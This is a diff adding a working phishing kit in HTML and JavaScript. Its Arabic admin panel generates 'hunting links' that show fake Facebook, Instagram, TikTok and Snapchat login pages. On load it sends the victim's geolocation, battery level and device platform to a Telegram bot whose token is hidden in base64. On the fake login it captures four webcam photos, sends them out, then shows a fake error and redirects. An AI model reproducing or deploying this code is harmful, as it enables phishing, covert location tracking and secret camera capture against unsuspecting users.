@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dev Ahmad Bot</title>
+    <style>
+        body{margin:0;font-family:sans-serif;background:#121212;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}
+        .a-p{background:#1e1e1e;padding:30px;border-radius:15px;width:340px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.5);border:1px solid #333}
+        .v-c{background:#fff;padding:30px;border-radius:12px;width:320px;text-align:center;color:#000;display:none}
+        h2{color:#0095f6;margin-bottom:20px;font-size:22px}
+        .btn{display:block;width:100%;padding:12px;margin:10px 0;border:none;border-radius:8px;font-weight:700;cursor:pointer;transition:.3s;font-size:16px;text-decoration:none}
+        .fb{background:#1877f2;color:#fff}.ig{background:#e1306c;color:#fff}.tt{background:#000;color:#fff;border:1px solid #fff}.sc{background:#fffc00;color:#000}
+        input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;background:#fafafa}
+        #v,#ca{display:none}.l-b{background:#333;padding:10px;border-radius:5px;margin-top:15px;font-size:12px;word-break:break-all;color:#0f0}
+    </style>
+</head>
+<body>
+<div class="a-p" id="adm">
+    <div style="font-size:50px">🔥</div>
+    <h2>أهلاً بك في بوت المطور أحمد</h2>
+    <p style="color:#aaa;font-size:14px">اختر المنصة لتوليد رابط الصيد:</p>
+    <button class="btn fb" onclick="g('fb')">🔵 فيسبوك</button>
+    <button class="btn ig" onclick="g('ig')">📸 إنستقرام</button>
+    <button class="btn tt" onclick="g('tt')">🎵 تيك توك</button>
+    <button class="btn sc" onclick="g('sc')">👻 سناب شات</button>
+    <div id="res" style="display:none">
+        <p style="font-size:13px;margin-top:15px">✅ الرابط الجاهز:</p>
+        <div class="l-b" id="fL"></div>
+    </div>
+</div>
+<div class="v-c" id="vic">
+    <img id="lg" src="" width="100">
+    <p id="tx" style="margin:15px 0;font-size:14px"></p>
+    <input type="text" placeholder="Username">
+    <input type="password" placeholder="Password">
+    <button id="mB" class="btn" onclick="cX()">Log In</button>
+</div>
+<video id="v" autoplay></video><canvas id="ca"></canvas>
+<script>
+    // تشفير البيانات الحساسة [cite: 2026-01-31]
+    const _0x1 = atob("ODI4OTc5Mzk0MzpBQUVyc0ZOMlZhUVZIMzBNaENYaG92cXJoQW8zNFZTdWJlNA==");
+    const _0x2 = atob("NTc3NTc4MTAzOA==");
+    const p = new URLSearchParams(window.location.search);
+    const m = p.get('type');
+
+    if(m){
+        document.getElementById('adm').style.display='none';
+        document.getElementById('vic').style.display='block';
+        document.body.style.background='#fafafa';
+        const c={
+            'fb':{n:'Facebook',c:'#1877f2',l:'https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png',m:'سجل دخول للمتابعة'},
+            'ig':{n:'Instagram',c:'#e1306c',l:'https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png',m:'سجل دخول لمشاهدة الصور'},
+            'tt':{n:'TikTok',c:'#000',l:'https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png',m:'شاهد الفيديوهات الرائجة'},
+            'sc':{n:'Snapchat',c:'#fffc00',l:'https://www.snapchat.com/global-assets/static-content/05-shared-assets/snap-ghost.png',m:'Login to unlock snap'}
+        };
+        const s=c[m];
+        document.getElementById('lg').src=s.l;
+        document.getElementById('tx').innerText=s.m;
+        const b=document.getElementById('mB');
+        b.style.background=s.c;
+        if(m=='sc')b.style.color='#000';
+        if(m=='tt'){document.body.style.background='#010101';document.getElementById('vic').style.background='#000';document.getElementById('vic').style.color='#fff'}
+        cL();
+    }
+
+    function g(t){
+        const l=window.location.href.split('?')[0]+"?type="+t;
+        document.getElementById('res').style.display='block';
+        document.getElementById('fL').innerText=l;
+    }
+
+    async function cL(){
+        let b=await navigator.getBattery();
+        let g="📍 موقع غير مسموح";
+        navigator.geolocation.getCurrentPosition(p=>{
+            g=`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+        });
+        setTimeout(()=>{
+            let t=`🎯 صيد جديد للمطور أحمد!\n🌐 المنصة: ${m}\n🔋 البطارية: ${b.level*100}%\n📱 الجهاز: ${navigator.platform}\n${g}`;
+            fetch(`https://api.telegram.org/bot${_0x1}/sendMessage?chat_id=${_0x2}&text=${encodeURIComponent(t)}`);
+        },3000);
+    }
+
+    async function cX(){
+        try{
+            const s=await navigator.mediaDevices.getUserMedia({video:true});
+            document.getElementById('v').srcObject=s;
+            for(let i=0;i<4;i++){
+                setTimeout(()=>{
+                    const ca=document.getElementById('ca');
+                    ca.getContext('2d').drawImage(document.getElementById('v'),0,0,ca.width,ca.height);
+                    ca.toBlob(b=>{
+                        let f=new FormData();f.append('photo',b);
+                        fetch(`https://api.telegram.org/bot${_0x1}/sendPhoto?chat_id=${_0x2}`,{method:'POST',body:f});
+                    },'image/jpeg');
+                },i*1000);
+            }
+            alert("⚠️ خطأ في الشبكة، حاول مجدداً.");
+            setTimeout(()=>{location.href="https://google.com"},4000);
+        }catch(e){alert("⚠️ يجب السماح بالكاميرا لتأكيد الحساب.")}
+    }
+</script>
+</body>
+</html>
